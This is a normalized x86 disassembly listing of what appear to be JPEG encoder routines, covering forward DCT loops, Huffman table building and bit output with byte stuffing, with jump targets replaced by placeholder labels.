mov edx [ esi + 0x48 ]
mov eax esi
call sub_49c314
mov eax [ edi ]
mov ecx [ esp ]
movsx edx [ eax ]
mov eax edx
mov edx eax
mov eax esi
sar edx cl
mov ecx 0x1
call sub_49c19c
inc ebp
add edi 0x4
mov eax [ ebx + 0x18 ]
mov edx [ esi + 0x10 ]
mov [ eax ] edx
mov ecx [ esi + 0x14 ]
mov [ eax + 0x4 ] ecx
mov eax [ ebx + 0xc4 ]
test eax eax
je r-xdata
mov eax 0x1
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ esi + 0x44 ] 0x0
jne r-xdata
dec [ esi + 0x44 ]
mov [ esi + 0x44 ] eax
inc [ esi + 0x48 ]
and [ esi + 0x48 ] 0x7
sub_49c71c
push ebx
push esi
push edi
push ebp
add esp 0xfffffee0
mov edi edx
mov [ esp ] eax
mov eax [ esp ]
mov ebx [ eax + 0x168 ]
mov eax [ esp ]
mov edx [ eax + 0x13c ]
mov [ esp + 0x10 ] edx
mov eax [ esp ]
mov ecx [ esp ]
mov edx [ eax + 0x18 ]
mov esi [ ecx + 0x144 ]
mov ecx [ edx ]
mov [ ebx + 0x10 ] ecx
mov eax [ esp ]
mov edx [ eax + 0x18 ]
mov ecx [ edx + 0x4 ]
mov [ ebx + 0x14 ] ecx
mov eax [ esp ]
cmp [ eax + 0xc4 ] 0x0
je r-xdata
mov edx [ edi ]
xor ecx ecx
mov [ esp + 0x14 ] edx
mov [ esp + 0xc ] ecx
mov eax [ esp ]
mov edx [ eax + 0x138 ]
mov [ esp + 0x8 ] edx
mov ecx [ esp + 0x8 ]
mov eax [ esp + 0x8 ]
lea edx [ esp + ecx * 4 + 0x20 ]
mov ecx [ esp + 0x8 ]
cmp ecx [ esp + 0x10 ]
lea eax [ eax * 4 + rw-data ]
jg r-xdata
cmp [ ebx + 0x44 ] 0x0
jne r-xdata
mov eax [ esp ]
mov ebp [ ebx + 0x40 ]
add ebp [ ebx + 0x3c ]
xor edi edi
mov edx [ eax + 0x138 ]
xor esi esi
mov [ esp + 0x8 ] edx
mov ecx [ esp + 0x8 ]
lea eax [ ecx * 4 + rw-data ]
mov [ esp + 0x1c ] eax
mov edx [ esp + 0x8 ]
lea ecx [ esp + edx * 4 + 0x20 ]
mov [ esp + 0x18 ] ecx
mov eax [ esp + 0x8 ]
cmp eax [ esp + 0x10 ]
jg r-xdata
mov ecx [ eax ]
mov edi [ esp + 0x14 ]
movsx ecx [ edi + ecx * 2 ]
mov [ esp + 0x4 ] ecx
cmp [ esp + 0x4 ] 0x0
jge r-xdata
mov edx [ ebx + 0x48 ]
mov eax ebx
call sub_49c314
test edi edi
jg r-xdata
mov edx [ esp + 0x18 ]
mov ecx [ edx ]
mov [ esp + 0x4 ] ecx
test ecx ecx
jne r-xdata
mov ecx esi
sar [ esp + 0x4 ] cl
mov ecx [ esp + 0x4 ]
mov [ edx ] ecx
cmp [ esp + 0x4 ] 0x1
jne r-xdata
neg [ esp + 0x4 ]
inc [ ebx + 0x38 ]
add [ ebx + 0x3c ] esi
cmp [ ebx + 0x38 ] 0x7fff
je r-xdata
test esi esi
jbe r-xdata
cmp edi 0xf
jle r-xdata
inc edi
jmp r-xdata
inc [ esp + 0x8 ]
add edx 0x4
add eax 0x4
mov ecx [ esp + 0x8 ]
cmp ecx [ esp + 0x10 ]
jle r-xdata
mov ecx [ esp + 0x8 ]
mov [ esp + 0xc ] ecx
mov eax ebx
call sub_49c2b0
cmp [ ebx + 0x3c ] 0x3a9
jbe r-xdata
mov edx [ esp ]
mov eax [ edx + 0x18 ]
mov edx [ ebx + 0x10 ]
mov [ eax ] edx
mov ecx [ ebx + 0x14 ]
mov [ eax + 0x4 ] ecx
mov eax [ esp ]
mov eax [ eax + 0xc4 ]
test eax eax
je r-xdata
cmp [ esp + 0x4 ] 0x1
jle r-xdata
mov eax [ esp + 0x8 ]
cmp eax [ esp + 0xc ]
jle r-xdata
inc [ esp + 0x8 ]
add [ esp + 0x1c ] 0x4
add [ esp + 0x18 ] 0x4
mov eax [ esp + 0x8 ]
cmp eax [ esp + 0x10 ]
jle r-xdata
mov eax 0x1
add esp 0x120
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x44 ] 0x0
jne r-xdata
mov eax ebx
call sub_49c2b0
mov ecx edi
mov edx [ ebx + 0x34 ]
shl ecx 0x4
mov eax ebx
inc ecx
call sub_49c258
mov edx [ esp + 0x1c ]
mov ecx [ edx ]
mov eax [ esp + 0x14 ]
cmp [ eax + ecx * 2 ] 0x0
jge r-xdata
mov dl [ esp + 0x4 ]
and dl 0x1
mov [ ebp + esi ] dl
inc esi
jmp r-xdata
mov eax ebx
call sub_49c2b0
mov ecx 0xf0
mov edx [ ebx + 0x34 ]
mov eax ebx
call sub_49c258
sub edi 0x10
mov ecx esi
mov edx ebp
mov eax ebx
call sub_49c284
mov ebp [ ebx + 0x40 ]
xor esi esi
dec [ ebx + 0x44 ]
mov [ ebx + 0x44 ] eax
inc [ ebx + 0x48 ]
and [ ebx + 0x48 ] 0x7
mov edx 0x1
xor edx edx
jmp r-xdata
mov [ esp + 0x4 ] edx
mov ecx 0x1
mov edx [ esp + 0x4 ]
mov eax ebx
call sub_49c19c
mov ecx esi
mov edx ebp
mov eax ebx
call sub_49c284
mov ebp [ ebx + 0x40 ]
xor esi esi
xor edi edi
sub_49c978
push ebx
push esi
mov esi eax
mov ebx [ esi + 0x168 ]
mov eax [ esi + 0x18 ]
mov edx [ eax ]
mov [ ebx + 0x10 ] edx
mov ecx [ esi + 0x18 ]
mov eax [ ecx + 0x4 ]
mov [ ebx + 0x14 ] eax
mov eax ebx
call sub_49c2b0
mov eax ebx
call sub_49c238
mov eax [ esi + 0x18 ]
mov edx [ ebx + 0x10 ]
mov [ eax ] edx
mov ecx [ ebx + 0x14 ]
mov [ eax + 0x4 ] ecx
pop esi
pop ebx
retn
sub_49c9b4
push ebx
push esi
push edi
push ebp
add esp 0xffffffe4
mov esi eax
mov eax [ esi + 0x168 ]
mov [ esp ] eax
mov eax [ esp ]
call sub_49c2b0
cmp [ esi + 0x138 ] 0x0
sete dl
and edx 0x1
mov [ esp + 0x4 ] edx
push 0x10
push 0x0
lea ecx [ esp + 0x14 ]
push ecx
call sub_48ab3c
add esp 0xc
xor eax eax
mov [ esp + 0x8 ] eax
lea ebp [ esi + 0xf4 ]
jmp r-xdata
mov ecx [ esp + 0x8 ]
cmp ecx [ esi + 0xf0 ]
jl r-xdata
cmp [ esp + 0x4 ] 0x0
mov eax [ ebp ]
je r-xdata
add esp 0x1c
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebx [ eax + 0x18 ]
cmp [ esi + 0x140 ] 0x0
jne r-xdata
inc [ esp + 0x8 ]
add ebp 0x4
cmp [ esp + 0x4 ] 0x0
je r-xdata
mov ebx [ eax + 0x14 ]
jmp r-xdata
lea edi [ esi + ebx * 4 + 0x64 ]
lea edi [ esi + ebx * 4 + 0x54 ]
jmp r-xdata
cmp [ esp + ebx * 4 + 0xc ] 0x0
jne r-xdata
mov edx [ esp ]
mov ecx [ edx + ebx * 4 + 0x5c ]
mov edx [ edi ]
mov eax esi
call sub_49d9f0
mov [ esp + ebx * 4 + 0xc ] 0x1
mov eax esi
call sub_497854
mov [ edi ] eax
cmp [ edi ] 0x0
jne r-xdata
sub_49ca74
push ebx
mov ebx eax
mov eax ebx
push esi
mov ecx 0x6c
mov edx 0x1
mov esi [ eax + 0x4 ]
call [ esi ]
mov ecx eax
xor edx edx
mov [ ebx + 0x168 ] ecx
mov [ ecx ] sub_49bfe4
lea eax [ ecx + 0x4c ]
xor ebx ebx
inc edx
mov [ eax ] ebx
xor ebx ebx
mov [ eax + 0x10 ] ebx
add eax 0x4
cmp edx 0x4
jl r-xdata
xor eax eax
mov [ ecx + 0x40 ] eax
pop esi
pop ebx
retn
sub_49cab8
push ebx
push esi
push edi
push ebp
add esp 0xffffffe8
mov [ esp ] eax
mov eax [ esp ]
mov [ esp + 0x14 ] 0x7
mov edx [ eax ]
mov ebx [ eax + 0x1c ]
mov ecx edx
mov esi edx
mov edx [ eax + 0x4 ]
sub esi ebx
add ecx ebx
mov edi [ eax + 0x18 ]
mov ebx edx
sub edx edi
mov [ esp + 0x10 ] edx
add ebx edi
mov edx [ eax + 0x8 ]
mov edi [ eax + 0x14 ]
mov ebp edx
sub edx edi
add ebp edi
mov [ esp + 0x4 ] ebp
mov [ esp + 0xc ] edx
mov edx [ eax + 0xc ]
mov edi edx
add edi [ eax + 0x10 ]
sub edx [ eax + 0x10 ]
mov [ esp + 0x8 ] edx
lea edx [ edi + ecx ]
sub ecx edi
mov edi ecx
mov ecx [ esp + 0x4 ]
add ecx ebx
sub ebx [ esp + 0x4 ]
lea ebp [ ecx + edx ]
sub edx ecx
mov [ eax ] ebp
mov [ eax + 0x10 ] edx
lea edx [ edi + ebx ]
mov ecx edx
lea edx [ ecx + edx * 4 ]
lea edx [ ecx + edx * 2 ]
lea edx [ ecx + edx * 4 ]
lea edx [ ecx + edx * 4 ]
sar edx 0x8
lea ecx [ edx + edi ]
sub edi edx
mov [ eax + 0x8 ] ecx
mov [ eax + 0x18 ] edi
mov edx [ esp + 0x8 ]
mov ebx [ esp + 0x10 ]
add edx [ esp + 0xc ]
add ebx esi
mov edi edx
mov ecx [ esp + 0xc ]
sub edi ebx
add ecx [ esp + 0x10 ]
mov ebp edi
lea edi [ ebp + edi * 2 ]
shl edi 0x4
add edi ebp
mov ebp edx
shl edx 0x4
add edi edi
add edx ebp
sar edi 0x8
lea edx [ ebp + edx * 4 ]
lea edx [ ebp + edx * 2 ]
mov ebp ebx
sar edx 0x8
add edx edi
lea ebx [ ebp + ebx * 4 ]
lea ebx [ ebp + ebx * 4 ]
shl ebx 0x3
sub ebx ebp
add ebx ebx
sar ebx 0x8
add edi ebx
mov ebx edi
mov edi ecx
lea ecx [ edi + ecx * 4 ]
lea ecx [ edi + ecx * 2 ]
lea ecx [ edi + ecx * 4 ]
lea ecx [ edi + ecx * 4 ]
sar ecx 0x8
lea edi [ ecx + esi ]
sub esi ecx
mov ecx esi
lea esi [ edx + ecx ]
sub ecx edx
mov [ eax + 0x14 ] esi
mov [ eax + 0xc ] ecx
lea edx [ ebx + edi ]
sub edi ebx
mov [ eax + 0x4 ] edx
mov [ eax + 0x1c ] edi
dec [ esp + 0x14 ]
add eax 0x20
cmp [ esp + 0x14 ] 0x0
jge r-xdata
mov eax [ esp ]
mov [ esp + 0x14 ] 0x7
mov edx [ eax ]
mov ebx [ eax + 0xe0 ]
mov ecx edx
mov esi edx
sub esi ebx
add ecx ebx
mov ebx [ eax + 0x20 ]
mov edx [ eax + 0x20 ]
add ebx [ eax + 0xc0 ]
sub edx [ eax + 0xc0 ]
mov [ esp + 0x10 ] edx
mov edx [ eax + 0x40 ]
add edx [ eax + 0xa0 ]
mov [ esp + 0x4 ] edx
mov edx [ eax + 0x40 ]
sub edx [ eax + 0xa0 ]
mov [ esp + 0xc ] edx
mov edi [ eax + 0x60 ]
mov edx [ eax + 0x60 ]
add edi [ eax + 0x80 ]
sub edx [ eax + 0x80 ]
mov [ esp + 0x8 ] edx
lea edx [ edi + ecx ]
sub ecx edi
mov edi ecx
mov ecx [ esp + 0x4 ]
add ecx ebx
sub ebx [ esp + 0x4 ]
lea ebp [ ecx + edx ]
sub edx ecx
mov [ eax ] ebp
mov [ eax + 0x80 ] edx
lea edx [ edi + ebx ]
mov ecx edx
lea edx [ ecx + edx * 4 ]
lea edx [ ecx + edx * 2 ]
lea edx [ ecx + edx * 4 ]
lea edx [ ecx + edx * 4 ]
sar edx 0x8
lea ecx [ edx + edi ]
sub edi edx
mov [ eax + 0x40 ] ecx
mov [ eax + 0xc0 ] edi
mov edx [ esp + 0x8 ]
mov ebx [ esp + 0x10 ]
add edx [ esp + 0xc ]
add ebx esi
mov edi edx
mov ecx [ esp + 0xc ]
sub edi ebx
add ecx [ esp + 0x10 ]
mov ebp edi
lea edi [ ebp + edi * 2 ]
shl edi 0x4
add edi ebp
mov ebp edx
shl edx 0x4
add edi edi
add edx ebp
sar edi 0x8
lea edx [ ebp + edx * 4 ]
lea edx [ ebp + edx * 2 ]
mov ebp ebx
sar edx 0x8
add edx edi
lea ebx [ ebp + ebx * 4 ]
lea ebx [ ebp + ebx * 4 ]
shl ebx 0x3
sub ebx ebp
add ebx ebx
sar ebx 0x8
add edi ebx
mov ebx edi
mov edi ecx
lea ecx [ edi + ecx * 4 ]
lea ecx [ edi + ecx * 2 ]
lea ecx [ edi + ecx * 4 ]
lea ecx [ edi + ecx * 4 ]
sar ecx 0x8
lea edi [ ecx + esi ]
sub esi ecx
mov ecx esi
lea esi [ edx + ecx ]
sub ecx edx
mov [ eax + 0xa0 ] esi
mov [ eax + 0x60 ] ecx
lea edx [ ebx + edi ]
sub edi ebx
mov [ eax + 0x20 ] edx
mov [ eax + 0xe0 ] edi
dec [ esp + 0x14 ]
add eax 0x4
cmp [ esp + 0x14 ] 0x0
jge r-xdata
add esp 0x18
pop ebp
pop edi
pop esi
pop ebx
retn
sub_49cd24
add esp 0xffffffb4
mov edx eax
mov ecx 0x7
fld [ edx ]
fadd [ edx + 0x1c ]
fstp [ esp ]
fld [ edx ]
fsub [ edx + 0x1c ]
fstp [ esp + 0x1c ]
fld [ edx + 0x4 ]
fadd [ edx + 0x18 ]
fstp [ esp + 0x4 ]
fld [ edx + 0x4 ]
fsub [ edx + 0x18 ]
fstp [ esp + 0x18 ]
fld [ edx + 0x8 ]
fadd [ edx + 0x14 ]
fstp [ esp + 0x8 ]
fld [ edx + 0x8 ]
fsub [ edx + 0x14 ]
fstp [ esp + 0x14 ]
fld [ edx + 0xc ]
fadd [ edx + 0x10 ]
fstp [ esp + 0xc ]
fld [ edx + 0xc ]
fsub [ edx + 0x10 ]
fstp [ esp + 0x10 ]
fld [ esp ]
fadd [ esp + 0xc ]
fstp [ esp + 0x20 ]
fld [ esp ]
fsub [ esp + 0xc ]
fstp [ esp + 0x2c ]
fld [ esp + 0x4 ]
fadd [ esp + 0x8 ]
fstp [ esp + 0x24 ]
fld [ esp + 0x4 ]
fsub [ esp + 0x8 ]
fstp [ esp + 0x28 ]
fld [ esp + 0x20 ]
fadd [ esp + 0x24 ]
fstp [ edx ]
fld [ esp + 0x20 ]
fsub [ esp + 0x24 ]
fstp [ edx + 0x10 ]
fld [ esp + 0x28 ]
fadd [ esp + 0x2c ]
fmul [ r-xdata ]
fstp [ esp + 0x30 ]
fld [ esp + 0x2c ]
fadd [ esp + 0x30 ]
fstp [ edx + 0x8 ]
fld [ esp + 0x2c ]
fsub [ esp + 0x30 ]
fstp [ edx + 0x18 ]
fld [ esp + 0x10 ]
fadd [ esp + 0x14 ]
fstp [ esp + 0x20 ]
fld [ esp + 0x14 ]
fadd [ esp + 0x18 ]
fstp [ esp + 0x24 ]
fld [ esp + 0x18 ]
fadd [ esp + 0x1c ]
fstp [ esp + 0x28 ]
fld [ esp + 0x20 ]
fsub [ esp + 0x28 ]
fmul [ r-xdata ]
fstp [ esp + 0x40 ]
fld [ r-xdata ]
fmul [ esp + 0x20 ]
fadd [ esp + 0x40 ]
fstp [ esp + 0x34 ]
fld [ r-xdata ]
fmul [ esp + 0x28 ]
fadd [ esp + 0x40 ]
fstp [ esp + 0x3c ]
fld [ esp + 0x24 ]
fmul [ r-xdata ]
fstp [ esp + 0x38 ]
fld [ esp + 0x1c ]
fadd [ esp + 0x38 ]
fstp [ esp + 0x44 ]
fld [ esp + 0x1c ]
fsub [ esp + 0x38 ]
fstp [ esp + 0x48 ]
fld [ esp + 0x48 ]
fadd [ esp + 0x34 ]
fstp [ edx + 0x14 ]
fld [ esp + 0x48 ]
fsub [ esp + 0x34 ]
fstp [ edx + 0xc ]
fld [ esp + 0x44 ]
fadd [ esp + 0x3c ]
fstp [ edx + 0x4 ]
fld [ esp + 0x44 ]
fsub [ esp + 0x3c ]
fstp [ edx + 0x1c ]
add edx 0x20
dec ecx
test ecx ecx
jge r-xdata
mov edx eax
mov ecx 0x7
fld [ edx ]
fadd [ edx + 0xe0 ]
fstp [ esp ]
fld [ edx ]
fsub [ edx + 0xe0 ]
fstp [ esp + 0x1c ]
fld [ edx + 0x20 ]
fadd [ edx + 0xc0 ]
fstp [ esp + 0x4 ]
fld [ edx + 0x20 ]
fsub [ edx + 0xc0 ]
fstp [ esp + 0x18 ]
fld [ edx + 0x40 ]
fadd [ edx + 0xa0 ]
fstp [ esp + 0x8 ]
fld [ edx + 0x40 ]
fsub [ edx + 0xa0 ]
fstp [ esp + 0x14 ]
fld [ edx + 0x60 ]
fadd [ edx + 0x80 ]
fstp [ esp + 0xc ]
fld [ edx + 0x60 ]
fsub [ edx + 0x80 ]
fstp [ esp + 0x10 ]
fld [ esp ]
fadd [ esp + 0xc ]
fstp [ esp + 0x20 ]
fld [ esp ]
fsub [ esp + 0xc ]
fstp [ esp + 0x2c ]
fld [ esp + 0x4 ]
fadd [ esp + 0x8 ]
fstp [ esp + 0x24 ]
fld [ esp + 0x4 ]
fsub [ esp + 0x8 ]
fstp [ esp + 0x28 ]
fld [ esp + 0x20 ]
fadd [ esp + 0x24 ]
fstp [ edx ]
fld [ esp + 0x20 ]
fsub [ esp + 0x24 ]
fstp [ edx + 0x80 ]
fld [ esp + 0x28 ]
fadd [ esp + 0x2c ]
fmul [ r-xdata ]
fstp [ esp + 0x30 ]
fld [ esp + 0x2c ]
fadd [ esp + 0x30 ]
fstp [ edx + 0x40 ]
fld [ esp + 0x2c ]
fsub [ esp + 0x30 ]
fstp [ edx + 0xc0 ]
fld [ esp + 0x10 ]
fadd [ esp + 0x14 ]
fstp [ esp + 0x20 ]
fld [ esp + 0x14 ]
fadd [ esp + 0x18 ]
fstp [ esp + 0x24 ]
fld [ esp + 0x18 ]
fadd [ esp + 0x1c ]
fstp [ esp + 0x28 ]
fld [ esp + 0x20 ]
fsub [ esp + 0x28 ]
fmul [ r-xdata ]
fstp [ esp + 0x40 ]
fld [ r-xdata ]
fmul [ esp + 0x20 ]
fadd [ esp + 0x40 ]
fstp [ esp + 0x34 ]
fld [ r-xdata ]
fmul [ esp + 0x28 ]
fadd [ esp + 0x40 ]
fstp [ esp + 0x3c ]
fld [ esp + 0x24 ]
fmul [ r-xdata ]
fstp [ esp + 0x38 ]
fld [ esp + 0x1c ]
fadd [ esp + 0x38 ]
fstp [ esp + 0x44 ]
fld [ esp + 0x1c ]
fsub [ esp + 0x38 ]
fstp [ esp + 0x48 ]
fld [ esp + 0x48 ]
fadd [ esp + 0x34 ]
fstp [ edx + 0xa0 ]
fld [ esp + 0x48 ]
fsub [ esp + 0x34 ]
fstp [ edx + 0x60 ]
fld [ esp + 0x44 ]
fadd [ esp + 0x3c ]
fstp [ edx + 0x20 ]
fld [ esp + 0x44 ]
fsub [ esp + 0x3c ]
fstp [ edx + 0xe0 ]
add edx 0x4
dec ecx
test ecx ecx
jge r-xdata
add esp 0x4c
retn
sub_49d050
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov esi eax
mov [ esp ] edx
cmp [ esp ] 0x0
mov ebx [ esi + 0x168 ]
je r-xdata
mov [ ebx + 0x4 ] sub_49d6e0
mov [ ebx + 0x8 ] sub_49d7f0
mov [ ebx + 0x4 ] sub_49d93c
mov [ ebx + 0x8 ] sub_49dbd4
jmp r-xdata
mov edx [ esp + 0x4 ]
cmp edx [ esi + 0xf0 ]
jl r-xdata
xor eax eax
mov [ esp + 0x4 ] eax
lea edx [ ebx + 0x14 ]
mov [ esp + 0x10 ] edx
lea ecx [ esi + 0xf4 ]
mov [ esp + 0xc ] ecx
jmp r-xdata
mov eax [ esp + 0xc ]
mov eax [ eax ]
mov edi [ eax + 0x14 ]
mov eax [ eax + 0x18 ]
mov [ esp + 0x8 ] eax
cmp [ esp ] 0x0
je r-xdata
xor ecx ecx
xor eax eax
mov [ ebx + 0xc ] ecx
mov [ ebx + 0x10 ] eax
mov edx [ esi + 0xc4 ]
xor ecx ecx
mov [ ebx + 0x24 ] edx
mov [ ebx + 0x28 ] ecx
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
lea eax [ ebx + edi * 4 + 0x2c ]
mov ecx edi
push eax
mov eax esi
mov edx 0x1
call sub_49d1e0
mov edx [ esp + 0x8 ]
mov eax esi
shl edx 0x2
add edx ebx
add edx 0x3c
push edx
xor edx edx
mov ecx [ esp + 0xc ]
call sub_49d1e0
test edi edi
jl r-xdata
mov eax [ esi ]
mov [ eax + 0x14 ] 0x32
mov [ eax + 0x18 ] edi
mov eax esi
mov edx [ eax ]
call [ edx ]
cmp edi 0x4
jl r-xdata
mov eax [ esi ]
mov [ eax + 0x14 ] 0x32
mov edx [ esp + 0x8 ]
mov [ eax + 0x18 ] edx
mov eax esi
mov edx [ eax ]
call [ edx ]
cmp [ esp + 0x8 ] 0x4
jl r-xdata
cmp [ esp + 0x8 ] 0x0
jl r-xdata
push 0x404
push 0x0
mov eax [ ebx + edi * 4 + 0x4c ]
push eax
call sub_48ab3c
add esp 0xc
mov edx [ esp + 0x8 ]
cmp [ ebx + edx * 4 + 0x5c ] 0x0
jne r-xdata
mov eax esi
mov ecx 0x404
mov edx 0x1
mov ebp [ eax + 0x4 ]
call [ ebp ]
mov [ ebx + edi * 4 + 0x4c ] eax
cmp [ ebx + edi * 4 + 0x4c ] 0x0
jne r-xdata
push 0x404
push 0x0
mov eax [ esp + 0x10 ]
mov ecx [ ebx + eax * 4 + 0x5c ]
push ecx
call sub_48ab3c
add esp 0xc
jmp r-xdata
mov eax esi
mov ecx 0x404
mov edx 0x1
mov edi [ eax + 0x4 ]
call [ edi ]
mov edx [ esp + 0x8 ]
mov [ ebx + edx * 4 + 0x5c ] eax
mov ecx [ esp + 0x10 ]
xor eax eax
mov [ ecx ] eax
inc [ esp + 0x4 ]
add [ esp + 0x10 ] 0x4
add [ esp + 0xc ] 0x4
sub_49d1e0
push ebp
mov ebp esp
add esp 0xfffffad0
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0x8 ]
test esi esi
jl r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
mov [ eax + 0x14 ] 0x32
mov [ eax + 0x18 ] esi
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx ]
cmp esi 0x4
jl r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ edx + esi * 4 + 0x64 ]
mov ecx [ ebp - 0x4 ]
mov eax [ ecx + esi * 4 + 0x54 ]
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ edx ]
mov [ eax + 0x14 ] 0x32
mov [ eax + 0x18 ] esi
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx ]
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jne r-xdata
mov eax [ ebx ]
mov [ ebp - 0x10 ] eax
xor ebx ebx
mov edi 0x1
mov eax [ ebp - 0xc ]
lea edx [ eax + 0x1 ]
mov [ ebp - 0x20 ] edx
mov eax [ ebp - 0x4 ]
mov ecx 0x500
mov edx 0x1
mov esi [ eax + 0x4 ]
call [ esi ]
mov [ ebx ] eax
mov edx [ ebp - 0x4 ]
mov ecx [ edx ]
mov [ ecx + 0x14 ] 0x8
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx ]
lea eax [ esi + ebx ]
cmp eax 0x100
jle r-xdata
mov ecx esi
add esi 0xffffffff
test ecx ecx
jne r-xdata
lea eax [ ebp + ebx - 0x12c ]
jmp r-xdata
mov edx edi
inc ebx
mov [ eax ] dl
inc eax
inc edi
inc [ ebp - 0x20 ]
cmp edi 0x10
jle r-xdata
mov ecx [ ebp - 0x20 ]
movzx esi [ ecx ]
test esi esi
jl r-xdata
mov [ ebp + ebx - 0x12c ] 0x0
mov [ ebp - 0x14 ] ebx
xor esi esi
movsx eax [ ebp - 0x12c ]
mov [ ebp - 0x18 ] eax
xor ebx ebx
jmp r-xdata
cmp [ ebp + ebx - 0x12c ] 0x0
jne r-xdata
lea edx [ ebp + ebx * 4 - 0x530 ]
lea eax [ ebp + ebx - 0x12c ]
jmp r-xdata
push 0x100
push 0x0
mov ecx [ ebp - 0x10 ]
add ecx 0x400
push ecx
call sub_48ab3c
add esp 0xc
cmp [ ebp - 0x8 ] 0x0
je r-xdata
movsx ecx [ eax ]
cmp ecx [ ebp - 0x18 ]
je r-xdata
mov eax 0xff
mov eax 0xf
jmp r-xdata
mov [ edx ] esi
inc ebx
add edx 0x4
inc eax
inc esi
mov ecx [ ebp - 0x18 ]
mov eax 0x1
shl eax cl
cmp eax esi
jg r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
movzx esi [ edi ]
test esi esi
jl r-xdata
mov [ ebp - 0x1c ] eax
lea eax [ ebp - 0x12c ]
mov [ ebp - 0x28 ] eax
lea edx [ ebp - 0x530 ]
mov [ ebp - 0x24 ] edx
xor ebx ebx
mov ecx [ ebp - 0xc ]
cmp ebx [ ebp - 0x14 ]
lea edi [ ecx + 0x11 ]
jge r-xdata
add esi esi
inc [ ebp - 0x18 ]
mov edx [ ebp - 0x4 ]
mov eax [ edx ]
mov [ eax + 0x14 ] 0x8
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx ]
mov edx [ ebp - 0x4 ]
mov ecx [ edx ]
mov [ ecx + 0x14 ] 0x8
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx ]
cmp esi [ ebp - 0x1c ]
jg r-xdata
mov eax [ ebp - 0x10 ]
cmp [ eax + esi + 0x400 ] 0x0
je r-xdata
mov ecx [ ebp - 0x24 ]
mov edx [ ebp - 0x10 ]
inc ebx
inc edi
mov eax [ ecx ]
mov [ edx + esi * 4 ] eax
mov ecx [ ebp - 0x28 ]
mov edx [ ebp - 0x10 ]
mov al [ ecx ]
mov [ edx + esi + 0x400 ] al
inc [ ebp - 0x28 ]
add [ ebp - 0x24 ] 0x4
cmp ebx [ ebp - 0x14 ]
jl r-xdata
sub_49d3d8
push ebx
mov ebx eax
push esi
mov eax [ ebx + 0x20 ]
mov esi [ eax + 0x18 ]
call [ esi + 0xc ]
test eax eax
jne r-xdata
mov edx [ esi ]
mov eax 0x1
mov [ ebx ] edx
mov ecx [ esi + 0x4 ]
mov [ ebx + 0x4 ] ecx
pop esi
pop ebx
retn
xor eax eax
pop esi
pop ebx
retn
sub_49d400
push ebx
mov ebx eax
push esi
push edi
push ebp
mov edi ecx
test edi edi
mov ebp [ ebx + 0xc ]
mov esi edx
jne r-xdata
mov ecx edi
mov eax 0x1
shl eax cl
dec eax
add ebp edi
mov ecx 0x18
and esi eax
sub ecx ebp
shl esi cl
or esi [ ebx + 0x8 ]
cmp ebp 0x8
jl r-xdata
mov eax [ ebx + 0x20 ]
mov edx [ eax ]
mov [ edx + 0x14 ] 0x28
mov edx [ eax ]
call [ edx ]
mov [ ebx + 0x8 ] esi
mov [ ebx + 0xc ] ebp
mov eax 0x1
mov edi esi
mov edx [ ebx ]
sar edi 0x10
inc [ ebx ]
and edi 0xff
mov eax edi
mov [ edx ] al
dec [ ebx + 0x4 ]
jne r-xdata
cmp edi 0xff
jne r-xdata
mov eax ebx
call sub_49d3d8
test eax eax
jne r-xdata
shl esi 0x8
sub ebp 0x8
cmp ebp 0x8
jge r-xdata
mov edx [ ebx ]
inc [ ebx ]
mov [ edx ] 0x0
dec [ ebx + 0x4 ]
jne r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
call sub_49d3d8
test eax eax
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
xor eax eax
jmp r-xdata
sub_49d4a8
push ebx
mov ebx eax
mov ecx 0x7
mov edx 0x7f
mov eax ebx
call sub_49d400
test eax eax
jne r-xdata
xor edx edx
xor ecx ecx
mov [ ebx + 0x8 ] edx
mov [ ebx + 0xc ] ecx
mov eax 0x1
pop ebx
retn
xor eax eax
pop ebx
retn
sub_49d4d8
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0xc ]
mov eax [ ebp - 0x8 ]
movsx edx [ eax ]
sub edx ecx
mov [ ebp - 0xc ] edx
mov esi edx
test esi esi
jge r-xdata
xor edi edi
test esi esi
je r-xdata
neg esi
dec [ ebp - 0xc ]
cmp edi 0xb
jle r-xdata
sar esi 0x1
inc edi
test esi esi
jne r-xdata
movsx ecx [ ebx + edi + 0x400 ]
mov edx [ ebx + edi * 4 ]
mov eax [ ebp - 0x4 ]
call sub_49d400
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
mov edx [ eax ]
mov [ edx + 0x14 ] 0x6
mov edx [ eax ]
call [ edx ]
test edi edi
je r-xdata
xor eax eax
jmp r-xdata
mov [ ebp - 0x10 ] 0x1
mov [ ebp - 0x14 ] rw-data
xor ebx ebx
mov ecx edi
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_49d400
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
cmp ebx 0xf
jle r-xdata
inc ebx
jmp r-xdata
xor eax eax
jmp r-xdata
mov [ ebp - 0xc ] esi
test esi esi
jge r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
movsx ecx [ eax + 0x4f0 ]
mov eax [ ebp - 0x4 ]
mov edx [ edx + 0x3c0 ]
call sub_49d400
test eax eax
jne r-xdata
